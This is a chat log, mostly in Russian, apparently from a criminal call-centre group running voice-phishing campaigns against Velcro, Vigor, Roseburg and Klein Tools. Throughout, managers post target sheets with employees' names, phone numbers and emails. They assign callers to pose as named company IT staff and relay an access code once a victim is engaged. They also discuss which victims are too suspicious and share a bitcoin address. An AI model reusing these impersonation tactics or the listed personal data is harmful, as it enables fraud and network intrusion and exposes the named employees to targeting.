+> aaguayo@velcro.com
+> 800 DeMuro Dr
+
+сюда
+--------------------
+[2024-04-05 16:27:16] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 16:27:19] @manager361:colorado.su: все как вчера
+--------------------
+[2024-04-05 16:28:47] @iamnurnazarov:matrix.org: через зойпер же, правильно?
+--------------------
+[2024-04-05 16:29:01] @iamnurnazarov:matrix.org: Manager - 361:
+--------------------
+[2024-04-05 16:29:27] @n3auxaxl:matrix.collectionofmanager.space: братец, если с битком получиться, вот адресс дублирую
+
+bc1q659tnrk0dm7c9x2c93wfqfcm87glqfqjudfz6h
+--------------------
+[2024-04-05 16:29:27] @manager361:colorado.su: да
+--------------------
+[2024-04-05 16:29:32] @n3auxaxl:matrix.collectionofmanager.space: заранее спасибо
+--------------------
+[2024-04-05 16:29:38] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 16:29:41] @n3auxaxl:matrix.collectionofmanager.space: а то серваки оффнуться могут скоро
+--------------------
+[2024-04-05 16:32:07] @iamnurnazarov:matrix.org: Michelle Fox несколько лет тут уже не работает
+--------------------
+[2024-04-05 16:32:11] @iamnurnazarov:matrix.org: retired
+--------------------
+[2024-04-05 16:32:27] @n3auxaxl:matrix.collectionofmanager.space: > <@n3auxaxl:matrix.collectionofmanager.space> Братец, а сможешь пожалуйста 6к закинуть, а то за серваки надо заплатить и у меня уже бабок нет почти, дохера очень ушло на эти операции, лекарства, реабилитации, вытрусили полностью)
+
+.
+--------------------
+[2024-04-05 16:32:47] @n3auxaxl:matrix.collectionofmanager.space: инет лагает сильно, отойду на 5 минут
+--------------------
+[2024-04-05 16:33:02] @iamnurnazarov:matrix.org: звоню второй?
+--------------------
+[2024-04-05 16:35:02] @colin:talks.icu: > <@iamnurnazarov:matrix.org> звоню второй?
+
+да
+--------------------
+[2024-04-05 16:35:32] @iamnurnazarov:matrix.org: calling
+--------------------
+[2024-04-05 16:36:07] @iamnurnazarov:matrix.org: Alva is unavailable
+--------------------
+[2024-04-05 16:36:55] @manager361:colorado.su: нужно было звонить только Alva)
+--------------------
+[2024-04-05 16:37:05] @manager361:colorado.su: Ну ладно
+--------------------
+[2024-04-05 16:37:08] @iamnurnazarov:matrix.org: аа, моя вина
+--------------------
+[2024-04-05 16:37:09] @manager361:colorado.su: сейчас скину еще
+--------------------
+[2024-04-05 16:38:37] @manager361:colorado.su: Velcro
+Description: Velcro Companies together comprise a technology-driven, global organization providing fastening solutions that solve problems in simple, elegant and surprising ways for businesses and consumers around the world. With more than 60 years of experience, Velcro Companies are proud of their heritage in innovation.
+
+HQ Location: 95 Sundial Ave Manchester, New Hampshire 03103, United States
+Employees: 1,001 - 5,000
+Revenue: $753.1 Million
+Industry: Textiles & Apparel, Manufacturing
+
+HQ Phone: (800) 225-0180 (HQ)
+
+—
+
+CALLLER
+Michael	Sousa
+IT Service Delivery Administrator
+(603) 480-5901
+msousa@velcro.com
+New Hampshire		United States
+
+OR
+
+Joan	Chretien
+Manager, Information Technology
+(603) 222-4848
+jchretien@velcro.com
+406 Brown Ave	Manchester	New Hampshire	3103	United States
+--------------------
+[2024-04-05 16:38:57] @manager361:colorado.su: Cathy Charest
+Account Manager
+(603) 413-3559
+ccharest@velcro.com
+95 Sundial Ave
+
+Doreen Kenney
+Customer Relations Specialist
+(603) 413-2992
+dkenney@velcro.com
+95 Sundial Ave
+
+--------------------
+[2024-04-05 16:39:04] @iamnurnazarov:matrix.org: принял
+--------------------
+[2024-04-05 16:39:29] @manager361:colorado.su: Звоним Cathy Charest и Doreen Kenney
+--------------------
+[2024-04-05 16:39:42] @iamnurnazarov:matrix.org: можно сейчас уже?
+--------------------
+[2024-04-05 16:39:55] @manager361:colorado.su: нет
+--------------------
+[2024-04-05 16:39:57] @manager361:colorado.su: написшу когда
+--------------------
+[2024-04-05 16:40:02] @manager361:colorado.su: * напишу когда
+--------------------
+[2024-04-05 16:40:03] @iamnurnazarov:matrix.org: ок
+--------------------
+[2024-04-05 16:41:19] @manager361:colorado.su: в 50 набирай
+--------------------
+[2024-04-05 16:41:25] @iamnurnazarov:matrix.org: принял
+--------------------
+[2024-04-05 16:45:12] @n3auxaxl:matrix.collectionofmanager.space: отойду на минут 40 +-, поем
+--------------------
+[2024-04-05 16:45:22] @n3auxaxl:matrix.collectionofmanager.space: а то еще с утра не ел
+--------------------
+[2024-04-05 16:50:08] @iamnurnazarov:matrix.org: calling
+--------------------
+[2024-04-05 16:50:43] @iamnurnazarov:matrix.org: voicemail
+--------------------
+[2024-04-05 16:51:12] @iamnurnazarov:matrix.org: звоню Doreen Kenney?
+--------------------
+[2024-04-05 16:51:21] @colin:talks.icu: > <@iamnurnazarov:matrix.org> звоню Doreen Kenney?
+
+да
+--------------------
+[2024-04-05 16:52:39] @iamnurnazarov:matrix.org: voicemail
+--------------------
+[2024-04-05 16:54:07] @manager361:colorado.su: попробуй набрать обоим без кода страны
+--------------------
+[2024-04-05 16:54:47] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 16:56:17] @iamnurnazarov:matrix.org: тоже самое
+--------------------
+[2024-04-05 16:56:31] @iamnurnazarov:matrix.org: программа же сама настраивает код страны в любом случае
+--------------------
+[2024-04-05 16:56:46] @manager361:colorado.su: ок давай дальше
+--------------------
+[2024-04-05 16:56:47] @manager361:colorado.su: Alva Aguayo
+Senior Customer Service Representative
+(520) 364-6916
+aaguayo@velcro.com
+800 DeMuro Dr
+
+Donna Ferguson
+Customer Relations, Medical Specialist
+(603) 413-2949
+dferguson@velcro.com
+95 Sundial Ave
+
+--------------------
+[2024-04-05 16:57:16] @iamnurnazarov:matrix.org: сейчас?
+--------------------
+[2024-04-05 16:57:22] @manager361:colorado.su: напишу
+--------------------
+[2024-04-05 16:57:26] @iamnurnazarov:matrix.org: ок
+--------------------
+[2024-04-05 16:58:27] @iamnurnazarov:matrix.org: я же Альве уже звонил, перезвонить?
+--------------------
+[2024-04-05 17:02:56] @manager880:colorado.su: нет
+--------------------
+[2024-04-05 17:02:58] @manager880:colorado.su: ошибка
+--------------------
+[2024-04-05 17:03:04] @manager880:colorado.su: только донна
+--------------------
+[2024-04-05 17:04:30] @iamnurnazarov:matrix.org: хорошо, дайте знать время
+--------------------
+[2024-04-05 17:06:04] @manager361:colorado.su: в 10 минут набирай
+--------------------
+[2024-04-05 17:06:10] @manager361:colorado.su: Donna Ferguson
+--------------------
+[2024-04-05 17:06:14] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 17:08:47] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-04-05 17:10:12] @manager361:colorado.su: звони
+--------------------
+[2024-04-05 17:10:14] @iamnurnazarov:matrix.org: звоню
+--------------------
+[2024-04-05 17:11:13] @iamnurnazarov:matrix.org: unavailable
+--------------------
+[2024-04-05 17:16:19] @manager361:colorado.su: минут 15-20 перерыв
+--------------------
+[2024-04-05 17:16:28] @iamnurnazarov:matrix.org: принял
+--------------------
+[2024-04-05 17:35:20] @arslanshabbirmalik:matrix.org: Hello sir
+--------------------
+[2024-04-05 17:35:32] @arslanshabbirmalik:matrix.org: I have called on all numbers
+--------------------
+[2024-04-05 17:36:19] @arslanshabbirmalik:matrix.org: Numbers were almost twice the size of last assignment
+--------------------
+[2024-04-05 17:37:16] @arslanshabbirmalik:matrix.org: Sir, I have a pregnant wife. I am saving money for her delivery.
+
+Please you area just and open hearted man.
+I am a poor person.
+My request to you is to take care of me like a family.
+
+I promise you, I shall be working for you all life.
+--------------------
+[2024-04-05 17:41:28] @manager361:colorado.su: Is your wife having a baby right now or something?
+--------------------
+[2024-04-05 17:41:55] @manager361:colorado.su: Vigor
+Description: Founded in 1995, Vigor provides ship repair and conversion, ship construction, barge building, industrial coating, machining, industrial real estate, and fabrication services. The company is headquartered in Portland, Oregon.
+
+HQ Location: 5555 N Channel Ave Portland, Oregon 97217, United States
+Employees: 1,001 - 5,000
+Revenue: $718.6 Million
+Industry: Boats & Submarines, Manufacturing
+
+HQ Phone: (503) 247-1777 (HQ)
+
+
+—
+
+CALLLER
+
+Catherine Phillips
+IT Asset Administrator
+Vigor, LLC
+Portland, OR, US
+catherine.phillips@vigor.net
+408-828-4938
+
+--------------------
+[2024-04-05 17:42:05] @manager361:colorado.su: Sarah Wilson
+1 Accounts Payable Specialist
+(971) 200-8287
+sarah.wilson@vigor.net
+5555 N Channel Ave
+
+Larry Million
+Manager, Materials & Logistics
+(503) 247-1841
+larry.million@vigor.net
+5555 N Channel Ave
+
+Cheri Young
+Payroll Analyst
+(971) 200-8296
+cheri.young@vigor.net
+5555 N Channel Ave
+
+--------------------
+[2024-04-05 17:42:05] @arslanshabbirmalik:matrix.org: No no sir. After 3 months then baby is expected
+--------------------
+[2024-04-05 17:42:22] @arslanshabbirmalik:matrix.org: 🙏❤️💚
+--------------------
+[2024-04-05 17:42:48] @manager361:colorado.su: напишу через сколько
+--------------------
+[2024-04-05 17:42:59] @iamnurnazarov:matrix.org: > <@manager361:colorado.su> Vigor
+> Description: Founded in 1995, Vigor provides ship repair and conversion, ship construction, barge building, industrial coating, machining, industrial real estate, and fabrication services. The company is headquartered in Portland, Oregon.
+>
+> HQ Location: 5555 N Channel Ave Portland, Oregon 97217, United States
+> Employees: 1,001 - 5,000
+> Revenue: $718.6 Million
+> Industry: Boats & Submarines, Manufacturing
+>
+> HQ Phone: (503) 247-1777 (HQ)
+>
+>
+> —
+>
+> CALLLER
+>
+> Catherine Phillips
+> IT Asset Administrator
+> Vigor, LLC
+> Portland, OR, US
+> catherine.phillips@vigor.net
+> 408-828-4938
+
+мне кажется я на Catherine голосом чуть не буду похож
+--------------------
+[2024-04-05 17:45:01] @manager361:colorado.su: Сорян
+--------------------
+[2024-04-05 17:45:04] @manager361:colorado.su: сейчас поправлю
+--------------------
+[2024-04-05 17:47:01] @manager361:colorado.su: в 50 набираем
+--------------------
+[2024-04-05 17:47:14] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 17:47:38] @iamnurnazarov:matrix.org: от имени кого получается звонить?
+--------------------
+[2024-04-05 17:48:03] @manager361:colorado.su: Ты Matthew Shea звонишь по поручению Bob Brenner
+--------------------
+[2024-04-05 17:48:44] @manager361:colorado.su: * Vigor
+Description: Founded in 1995, Vigor provides ship repair and conversion, ship construction, barge building, industrial coating, machining, industrial real estate, and fabrication services. The company is headquartered in Portland, Oregon.
+
+HQ Location: 5555 N Channel Ave Portland, Oregon 97217, United States
+Employees: 1,001 - 5,000
+Revenue: $718.6 Million
+Industry: Boats & Submarines, Manufacturing
+
+HQ Phone: (503) 247-1777 (HQ)
+
+
+—
+
+CALLLER
+
+Bob Brenner
+Vice President Information Technology
+Vigor, LLC
+Portland, Oregon, United States
+bob.brenner@vigor.net
+503-638-1050
+
+
+Matthew Shea
+IT Consultant
+Vigor, LLC
+Kirkland, WA, US
+matthew.shea@vigor.net
+425-640-1808
+
+--------------------
+[2024-04-05 17:48:56] @manager361:colorado.su: в описании заменил инфо
+--------------------
+[2024-04-05 17:49:04] @iamnurnazarov:matrix.org: was told to call by Bob Benner?
+--------------------
+[2024-04-05 17:49:15] @iamnurnazarov:matrix.org: принял
+--------------------
+[2024-04-05 17:49:30] @manager361:colorado.su: > <@iamnurnazarov:matrix.org> was told to call by Bob Benner?
+
+Ага
+--------------------
+[2024-04-05 17:49:56] @colin:talks.icu: главное уверенно)
+--------------------
+[2024-04-05 17:52:07] @manager361:colorado.su: I'll add more numbers now
+--------------------
+[2024-04-05 17:52:12] @iamnurnazarov:matrix.org: предъявила насчёт норме
+--------------------
+[2024-04-05 17:52:16] @arslanshabbirmalik:matrix.org: Ok sir.
+--------------------
+[2024-04-05 17:52:17] @manager361:colorado.su: Ready to work?
+--------------------
+[2024-04-05 17:52:22] @arslanshabbirmalik:matrix.org: Yes sir
+--------------------
+[2024-04-05 17:52:24] @iamnurnazarov:matrix.org: * предъявила насчёт номера
+--------------------
+[2024-04-05 17:52:31] @iamnurnazarov:matrix.org: то что не компанейский
+--------------------
+[2024-04-05 17:52:33] @manager361:colorado.su: что сказали?
+--------------------
+[2024-04-05 17:52:43] @iamnurnazarov:matrix.org: сказала чтобы Боб сам набрал
+--------------------
+[2024-04-05 17:53:34] @iamnurnazarov:matrix.org: Ларри набрать?
+--------------------
+[2024-04-05 17:54:13] @colin:talks.icu: > <@iamnurnazarov:matrix.org> Ларри набрать?
+
+на нем удачу попытаем
+--------------------
+[2024-04-05 17:54:21] @colin:talks.icu: да
+--------------------
+[2024-04-05 17:54:25] @iamnurnazarov:matrix.org: calling
+--------------------
+[2024-04-05 17:55:03] @colin:talks.icu: > <@iamnurnazarov:matrix.org> предъявила насчёт номера
+
+а про проблемы на компе успели поговорить вы?
+--------------------
+[2024-04-05 17:55:18] @iamnurnazarov:matrix.org: да, но сразу на тему номера перешла
+--------------------
+[2024-04-05 17:55:21] @manager361:colorado.su: не звони
+--------------------
+[2024-04-05 17:55:24] @manager361:colorado.su: они все в 1 офисе
+--------------------
+[2024-04-05 17:55:27] @manager361:colorado.su: смысла нет
+--------------------
+[2024-04-05 17:55:40] @iamnurnazarov:matrix.org: ок, unavailable в любом случае
+--------------------
+[2024-04-05 17:56:13] @colin:talks.icu: > <@manager361:colorado.su> они все в 1 офисе
+
+может далеко сидят?
+--------------------
+[2024-04-05 17:56:52] @manager361:colorado.su: ну давай попробуем
+--------------------
+[2024-04-05 17:56:57] @manager361:colorado.su: давай 3
+--------------------
+[2024-04-05 17:57:05] @manager361:colorado.su: чери
+--------------------
+[2024-04-05 17:57:09] @iamnurnazarov:matrix.org: звоню
+--------------------
+[2024-04-05 17:57:53] @iamnurnazarov:matrix.org: в автоответчик улетел
+--------------------
+[2024-04-05 17:58:41] @manager361:colorado.su: Start
+--------------------
+[2024-04-05 17:59:28] @arslanshabbirmalik:matrix.org: Received sir.
+--------------------
+[2024-04-05 18:01:47] @manager361:colorado.su: ок, сейчас еще дам
+--------------------
+[2024-04-05 18:01:52] @iamnurnazarov:matrix.org: ок
+--------------------
+[2024-04-05 18:09:38] @manager361:colorado.su: Roseburg
+Description: Roseburg was founded in 1936. This company provides the manufacturing and marketing of wood products. Their headquarters are located in Springfield, Oregon.
+
+HQ Location: 3660 Gateway St Springfield, Oregon 97477, United States
+Employees: 1,001 - 5,000
+Revenue: $867.9 Million
+Industry: Building Materials, Manufacturing
+
+HQ Phone: (541) 679-3311 (HQ)
+
+
+
+
+—
+
+CALLLER
+Ryan	Ragan
+Information Technology Systems Group
+ryanr@rfpco.com
+https://www.linkedin.com/in/ryan-ragan-3275a695
+3660 Gateway St	Springfield	Oregon	97477	United States
+
+OR
+
+James	Robles
+Information Technology Tech
+james.robles@rfpco.com
+https://www.linkedin.com/in/james-robles-09b86756
+3660 Gateway St	Springfield	Oregon	97477	United States
+
+--------------------
+[2024-04-05 18:09:56] @manager361:colorado.su: Mikaela Baird
+Executive Assistant, Human Resources
+(541) 679-2534
+mikaelab@rfpco.com
+PO Box 1088
+
+Michele Stone
+Purchasing Agent
+(541) 679-3311 ext. 54507
+micheles@rfpco.com
+Old Hwy 99 S
+
+--------------------
+[2024-04-05 18:10:23] @iamnurnazarov:matrix.org: время?
+--------------------
+[2024-04-05 18:10:41] @manager361:colorado.su: напишу
+--------------------
+[2024-04-05 18:12:39] @manager361:colorado.su: в 20
+--------------------
+[2024-04-05 18:12:46] @iamnurnazarov:matrix.org: принял
+--------------------
+[2024-04-05 18:19:48] @iamnurnazarov:matrix.org: звоню Mikaela Baird
+--------------------
+[2024-04-05 18:20:29] @arslanshabbirmalik:matrix.org: Sir, I have called half the number. Rest of the number I do in 10 minutes.
+My mobile phone is bit old fashioned. The charging lost quickly.
+I so apologise 🙏🙏🙏🫡
+--------------------
+[2024-04-05 18:20:54] @iamnurnazarov:matrix.org: voicemail 🤯
+--------------------
+[2024-04-05 18:21:36] @iamnurnazarov:matrix.org: callin to Michele
+--------------------
+[2024-04-05 18:22:00] @manager880:colorado.su: its ok
+--------------------
+[2024-04-05 18:23:34] @iamnurnazarov:matrix.org: выключила
+--------------------
+[2024-04-05 18:24:07] @arslanshabbirmalik:matrix.org: Thank you madam. So kind of you
+--------------------
+[2024-04-05 18:25:37] @manager361:colorado.su: перезвони
+--------------------
+[2024-04-05 18:25:43] @n3auxaxl:matrix.collectionofmanager.space: я тут, инет сегодня жесть просто
+--------------------
+[2024-04-05 18:25:44] @manager361:colorado.su: какбудьто прервалась связь просто
+--------------------
+[2024-04-05 18:25:51] @manager361:colorado.su: на полуслове
+--------------------
+[2024-04-05 18:25:51] @iamnurnazarov:matrix.org: ок, сейчас
+--------------------
+[2024-04-05 18:27:25] @iamnurnazarov:matrix.org: мишель на трансфер не отвечает теперь
+--------------------
+[2024-04-05 18:27:58] @manager361:colorado.su: давай дальше
+--------------------
+[2024-04-05 18:28:09] @iamnurnazarov:matrix.org: ок
+--------------------
+[2024-04-05 18:28:13] @manager361:colorado.su: Cindy Morgan
+Shipping Supervisor
+(541) 464-7023 ext. 57023
+cindym@rfpco.com
+3660 Gateway St
+
+Jennifer Serra
+Lumber Sales
+(541) 658-6116
+jenniferse@rfpco.com
+Eugene
+
+--------------------
+[2024-04-05 18:28:44] @iamnurnazarov:matrix.org: звоню
+--------------------
+[2024-04-05 18:29:02] @manager361:colorado.su: стой
+--------------------
+[2024-04-05 18:29:06] @manager361:colorado.su: напишу когда
+--------------------
+[2024-04-05 18:29:16] @iamnurnazarov:matrix.org: ок, жду
+--------------------
+[2024-04-05 18:30:13] @manager361:colorado.su: давай в 40 минут
+--------------------
+[2024-04-05 18:30:20] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 18:39:59] @iamnurnazarov:matrix.org: звоню
+--------------------
+[2024-04-05 18:41:23] @iamnurnazarov:matrix.org: cindy not ava
+--------------------
+[2024-04-05 18:41:31] @iamnurnazarov:matrix.org: calling to jennifer
+--------------------
+[2024-04-05 18:42:15] @iamnurnazarov:matrix.org: voicemail
+--------------------
+[2024-04-05 18:47:19] @manager361:colorado.su: а ты синди с экстешн намбер набирал?
+--------------------
+[2024-04-05 18:47:33] @iamnurnazarov:matrix.org: да, два раза
+--------------------
+[2024-04-05 18:48:01] @iamnurnazarov:matrix.org: там именно "cindy is not available" говорится \
+--------------------
+[2024-04-05 18:49:28] @manager361:colorado.su: Amanda Orth
+Project Manager, Compliance & Legal
+(541) 658-6107
+amandao@rfpco.com
+3660 Gateway St
+
+Andrea Pennell
+Payroll Administrator
+(541) 679-6346 ext. 2468
+andrea.pennell@rfpco.com
+10599 Old Hwy 99 S
+
+--------------------
+[2024-04-05 18:49:30] @manager361:colorado.su: напишу
+--------------------
+[2024-04-05 18:49:36] @iamnurnazarov:matrix.org: ок
+--------------------
+[2024-04-05 18:51:45] @manager361:colorado.su: в 00 набирай
+--------------------
+[2024-04-05 18:51:53] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 19:00:10] @iamnurnazarov:matrix.org: звоню
+--------------------
+[2024-04-05 19:02:08] @iamnurnazarov:matrix.org: она в деле
+--------------------
+[2024-04-05 19:02:11] @iamnurnazarov:matrix.org: нужен код
+--------------------
+[2024-04-05 19:02:21] @colin:talks.icu: 5M85FV
+--------------------
+[2024-04-05 19:02:27] @colin:talks.icu: 5M85FV
+--------------------
+[2024-04-05 19:02:27] @colin:talks.icu: 5M85FV
+--------------------
+[2024-04-05 19:03:47] @iamnurnazarov:matrix.org: ceo?
+--------------------
+[2024-04-05 19:03:56] @iamnurnazarov:matrix.org: CEOO????????
+--------------------
+[2024-04-05 19:04:06] @iamnurnazarov:matrix.org: ASAP
+--------------------
+[2024-04-05 19:04:13] @iamnurnazarov:matrix.org: colin:
+--------------------
+[2024-04-05 19:04:16] @colin:talks.icu: if
+--------------------
+[2024-04-05 19:04:31] @iamnurnazarov:matrix.org: fuck
+--------------------
+[2024-04-05 19:04:35] @iamnurnazarov:matrix.org: fuck fuck
+--------------------
+[2024-04-05 19:05:03] @iamnurnazarov:matrix.org: бля побыстрее нужно было
+--------------------
+[2024-04-05 19:05:38] @n3auxaxl:matrix.collectionofmanager.space: пойду отдыхать, завтра с утра буду на связи
+--------------------
+[2024-04-05 19:05:42] @n3auxaxl:matrix.collectionofmanager.space: добрых
+--------------------
+[2024-04-05 19:05:48] @manager361:colorado.su: давай следующей чтоли тогда
+--------------------
+[2024-04-05 19:06:08] @iamnurnazarov:matrix.org: пздц она просто у коллеги начала уточнять
+--------------------
+[2024-04-05 19:06:21] @iamnurnazarov:matrix.org: типо с кем работаем по колл центру и тд.
+--------------------
+[2024-04-05 19:06:37] @manager361:colorado.su: мм, ну бывает
+--------------------
+[2024-04-05 19:06:40] @iamnurnazarov:matrix.org: > <@manager361:colorado.su> давай следующей чтоли тогда
+
+звоню
+--------------------
+[2024-04-05 19:06:44] @manager361:colorado.su: нужна та кто не спросит)
+--------------------
+[2024-04-05 19:07:01] @iamnurnazarov:matrix.org: ок
+--------------------
+[2024-04-05 19:07:15] @iamnurnazarov:matrix.org: звоню Andrea Pennell
+--------------------
+[2024-04-05 19:07:32] @iamnurnazarov:matrix.org: неи
+--------------------
+[2024-04-05 19:07:36] @colin:talks.icu: а сео то кто?)
+--------------------
+[2024-04-05 19:07:51] @iamnurnazarov:matrix.org: > <@colin:talks.icu> а сео то кто?)
+
+он меня в чс кинул
+--------------------
+[2024-04-05 19:08:02] @iamnurnazarov:matrix.org: > <@colin:talks.icu> а сео то кто?)
+
+без понятия, не сказала
+--------------------
+[2024-04-05 19:08:05] @colin:talks.icu: Stuart Gray - President & CEO
+--------------------
+[2024-04-05 19:08:11] @colin:talks.icu: да это он
+--------------------
+[2024-04-05 19:08:24] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 19:08:25] @manager361:colorado.su: > <@iamnurnazarov:matrix.org> звоню Andrea Pennell
+
+в чс?
+--------------------
+[2024-04-05 19:08:49] @iamnurnazarov:matrix.org: не наберается, она говорила что рядом у коллег тоже такая проблема
+--------------------
+[2024-04-05 19:08:54] @iamnurnazarov:matrix.org: и походу предупредила
+--------------------
+[2024-04-05 19:09:05] @iamnurnazarov:matrix.org: image.png
+--------------------
+[2024-04-05 19:09:17] @colin:talks.icu: адреса же разные
+--------------------
+[2024-04-05 19:09:17] @colin:talks.icu: не факт что они там вместе
+--------------------
+[2024-04-05 19:09:23] @manager361:colorado.su: ага
+--------------------
+[2024-04-05 19:09:29] @iamnurnazarov:matrix.org: не берет всё же
+--------------------
+[2024-04-05 19:09:35] @iamnurnazarov:matrix.org: может у них общий чат есть
+--------------------
+[2024-04-05 19:09:46] @manager361:colorado.su: ок, давай дальше тогда пойдем
+--------------------
+[2024-04-05 19:09:51] @iamnurnazarov:matrix.org: ок
+--------------------
+[2024-04-05 19:10:22] @manager361:colorado.su: Klein Tools
+Description: Family-owned and operated since 1857, Klein Tools has provided professional tradespeople with tools and solutions that enable the highest levels of performance and safety. They are driven to be the worlds most innovative and customer-centric, trade-focused tool company. For over 160 years, they at Klein Tools have worked hard to earn the trust and gain credibility with their customers by achieving world-class quality and on-time delivery standards. Their teams are built to continuously develop and deliver innovative new products that solve problems for their customers. This has led to steady growth which Klein Tools continues to fuel through expansion of teams and capabilities. Quality, Customer Obsession, Innovation, Teamwork, and Ownership make up the core of Klein Tools. These five distinguishing values define our companys culture and how we operate as an organization. They believe that these values set their business above others in their industry.
+
+HQ Location: 450 Bond St Lincolnshire, Illinois 60069, United States
+Employees: 1,001 - 5,000
+Revenue: $355.1 Million
+Industry: Hand, Power & Lawn-care Tools, Manufacturing, Manufacturing | Building Materials, Textiles & Apparel, Minerals & Mining
+
+
+HQ Phone: (847) 821-5500 (HQ)
+
+
+
+—
+
+CALLLER
+
+Blake	Getzendanner
+IT Infrastructure Manager
+(817) 539-2834
+bgetzendanner@kleintools.com
+https://www.linkedin.com/in/blake-getzendanner
+500 Klein Tools Blvd	Mansfield	Texas	76063	United States
+
+OR
+
+Crystal	Coleman
+IT Asset Administrator
+ccoleman@kleintools.com
+
+OR
+
+Arnulfo	Garcia
+Senior Operations IT Specialist
+(817) 539-2871
+agarcia@kleintools.com
+https://www.linkedin.com/in/arngarc
+500 Easy Dr	Mansfield	Texas	76063	United States
+--------------------
+[2024-04-05 19:10:33] @iamnurnazarov:matrix.org: принял
+--------------------
+[2024-04-05 19:10:33] @manager361:colorado.su: Laurene Bork
+Credit & Collection Specialist
+(847) 821-3231
+lbork@kleintools.com
+450 Bond St
+
+Yolanda Landa
+Accounts Receivable Clerk
+(847) 821-3233
+ylanda@kleintools.com
+450 Bond St
+
+Amy Garnett
+Credit & Collections Analyst
+(847) 821-3228
+agarnett@kleintools.com
+450 Bond St
+
+--------------------
+[2024-04-05 19:10:53] @manager361:colorado.su: напишу
+--------------------
+[2024-04-05 19:10:56] @iamnurnazarov:matrix.org: ок
+--------------------
+[2024-04-05 19:13:55] @manager361:colorado.su: давай в 20
+--------------------
+[2024-04-05 19:14:50] @iamnurnazarov:matrix.org: принял
+--------------------
+[2024-04-05 19:15:10] @iamnurnazarov:matrix.org: есть возможность кто CEO узнать?)
+--------------------
+[2024-04-05 19:17:07] @manager880:colorado.su: думаю да
+--------------------
+[2024-04-05 19:19:25] @iamnurnazarov:matrix.org: звоню Laurene Bork
+--------------------
+[2024-04-05 19:20:16] @iamnurnazarov:matrix.org: not ava
+--------------------
+[2024-04-05 19:20:41] @iamnurnazarov:matrix.org: calling Yolanda Landa
+--------------------
+[2024-04-05 19:21:26] @iamnurnazarov:matrix.org: not aba
+--------------------
+[2024-04-05 19:21:30] @iamnurnazarov:matrix.org: * not ava
+--------------------
+[2024-04-05 19:21:36] @iamnurnazarov:matrix.org: calling Amy
+--------------------
+[2024-04-05 19:22:15] @iamnurnazarov:matrix.org: not ava
+--------------------
+[2024-04-05 19:24:08] @manager361:colorado.su: Laurene Bork
+Credit & Collection Specialist
+(847) 821-3231
+--------------------
+[2024-04-05 19:24:15] @manager361:colorado.su: дозвонился, взяла лорейн
+--------------------
+[2024-04-05 19:24:28] @iamnurnazarov:matrix.org: у меня автоотвечтик стоял
+--------------------
+[2024-04-05 19:24:32] @manager361:colorado.su: звони без кода
+--------------------
+[2024-04-05 19:24:52] @iamnurnazarov:matrix.org: я без кода и звоню
+--------------------
+[2024-04-05 19:25:04] @iamnurnazarov:matrix.org: cope - paste просто
+--------------------
+[2024-04-05 19:25:26] @manager361:colorado.su: давай лорейн еще раз
+--------------------
+[2024-04-05 19:25:33] @manager361:colorado.su: оба нижних нот ав
+--------------------
+[2024-04-05 19:25:41] @iamnurnazarov:matrix.org: ок ок
+--------------------
+[2024-04-05 19:25:43] @iamnurnazarov:matrix.org: звоню
+--------------------
+[2024-04-05 19:26:28] @iamnurnazarov:matrix.org: same
+--------------------
+[2024-04-05 19:26:59] @iamnurnazarov:matrix.org: не то скинул
+--------------------
+[2024-04-05 19:27:06] @iamnurnazarov:matrix.org: там просто автоотвечтик
+--------------------
+[2024-04-05 19:27:30] @iamnurnazarov:matrix.org: recorded_conversation_2024-04-06-01_25_45_part001.wav
+--------------------
+[2024-04-05 19:29:21] @manager361:colorado.su: мм
+--------------------
+[2024-04-05 19:29:29] @manager361:colorado.su: ну давай дальше
+--------------------
+[2024-04-05 19:29:34] @manager361:colorado.su: минут 10-15 перерыв
+--------------------
+[2024-04-05 19:29:43] @manager880:colorado.su: щас пока не звоним же
+--------------------
+[2024-04-05 19:29:44] @manager880:colorado.su: ?
+--------------------
+[2024-04-05 19:29:45] @manager880:colorado.su: пауза
+--------------------
+[2024-04-05 19:29:47] @manager880:colorado.su: ?
+--------------------
+[2024-04-05 19:29:50] @manager361:colorado.su: да
+--------------------
+[2024-04-05 19:29:56] @colin:talks.icu: Matthew Thomason
+Chief Financial Officer
+Klein Tools
+
+
+Michael Farrah
+Group President
+Klein Tools
+
+
+Bryan McGraw
+Executive Director, Information Technology
+
+--------------------
+[2024-04-05 19:29:57] @iamnurnazarov:matrix.org: принял
+--------------------
+[2024-04-05 19:30:17] @manager880:colorado.su: Paul Miller:  есть просьба
+--------------------
+[2024-04-05 19:30:29] @manager880:colorado.su: 459100-1712343618.2688091-102-2024-04-05-150018.mp3
+--------------------
+[2024-04-05 19:30:46] @manager880:colorado.su: 03:37 таймкод
+--------------------
+[2024-04-05 19:31:12] @manager880:colorado.su: можешь проанализировать
+--------------------
+[2024-04-05 19:31:15] @manager880:colorado.su: что там она говорит
+--------------------
+[2024-04-05 19:31:18] @manager880:colorado.su: и что ей отвечают
+--------------------
+[2024-04-05 19:31:30] @manager880:colorado.su: и передать сюда свою интерпретацию
+--------------------
+[2024-04-05 19:31:43] @manager880:colorado.su: попытка хорошая, ее засчитаем
+--------------------
+[2024-04-05 19:31:57] @manager880:colorado.su: но надо бы провести работу над ошибками
+--------------------
+[2024-04-05 19:32:33] @manager880:colorado.su: как минимум, для кода подготовить список слов соответствий, чтобы как в этот раз она там не тупил на счет слова Virginia
+--------------------
+[2024-04-05 19:32:39] @arslanshabbirmalik:matrix.org: Hello sir, I have called all the number and added the comments.
+--------------------
+[2024-04-05 19:33:05] @manager880:colorado.su: есть помоему какойто устоявшийся список соответствий, который используется в таких случаях
+--------------------
+[2024-04-05 19:33:49] @manager880:colorado.su: Manager - 361:  will do all calculations
+--------------------
+[2024-04-05 19:33:53] @manager880:colorado.su: and you will be paid
+--------------------
+[2024-04-05 19:33:57] @manager880:colorado.su: we done for today
+--------------------
+[2024-04-05 19:34:11] @manager880:colorado.su: thank you
+
+I listened couple of your calls
+--------------------
+[2024-04-05 19:34:14] @manager880:colorado.su: well done
+--------------------
+[2024-04-05 19:34:17] @manager880:colorado.su: I like your style
+--------------------
